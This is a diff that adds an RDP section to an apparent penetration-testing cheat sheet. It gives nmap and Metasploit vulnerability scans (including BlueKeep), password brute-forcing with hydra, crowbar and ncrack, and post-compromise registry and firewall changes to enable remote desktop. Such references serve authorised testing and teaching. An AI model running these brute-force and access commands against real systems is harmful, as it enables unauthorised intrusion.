@@ -136,3 +136,46 @@ dsquery computer -limit 0
 bloodhound-python -c all -u user -p 'Password123!' -d corp.local -ip <target>
 ldapdomaindump -u UAP.local\\peter -p "password" <domain-ip> #get all information about 
 ```
+
+Port RDP 3389 enumeration :
+```bash
+#using nmap
+nmap -p 3389 <target>
+nmap -sV -p 3389 <target>
+nmap --script rdp-enum-encryption -p 3389 <target>
+nmap --script rdp-ntlm-info -p 3389 <target>
+nmap --script rdp-enum-encryption -p 3389 <target>
+nmap --script rdp-ntlm-info -p 3389 <target>
+nmap --script rdp-enum-encryption -p 3389 <target>
+nmap -p3389 --script rdp-vuln-ms12-020 <target>
+nmap -p3389 --script rdp-vuln-ms19-0708 <target>
+
+
+rdpscan <target>
+
+msfconsole
+use auxiliary/scanner/rdp/rdp_scanner
+set RHOSTS <target>
+run
+msfconsole
+use auxiliary/scanner/rdp/rdp_scanner
+use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
+
+
+hydra -t 4 -V -f -L users.txt -P passwords.txt rdp://<target>
+hydra -t 4 -V -f -l <user> -P rockyou.txt rdp://<target>
+
+crowbar -b rdp -s <target>/32 -u <user> -C passwords.txt
+
+ncrack -vv --user <user> -P passwords.txt rdp://<target>
+
+
+
+#if domain admin is compromised 
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+
+xfreerdp /v:192.168.2.200 /u:domain_user  /d:UAP.local +clipboard /dynamic-resolution /drive:/home/kali/Download/,share
+
+```
